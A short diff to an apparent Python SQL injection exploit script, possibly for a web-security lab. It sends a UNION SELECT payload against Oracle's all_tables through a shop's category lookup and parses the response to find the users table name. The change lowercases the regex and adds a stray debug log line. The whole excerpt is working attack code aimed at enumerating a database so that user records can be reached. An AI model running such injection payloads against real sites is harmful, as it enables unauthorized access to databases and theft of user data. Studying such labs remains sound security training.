@@ -37,7 +37,8 @@ def main(args):
     resp = shop.get_category(
         f"' UNION SELECT {nulls} from all_tables where owner='SYSTEM'-- "
     )
-    pattern = re.compile(r"<th>(USERS_.*?)</th>")
+    log.info("DDODO")
+    pattern = re.compile(r"<th>(users_.*?)</th>")
     m = pattern.search(resp.text)
     users_table = m[1]
     log.info(f"Found users table: {users_table}")
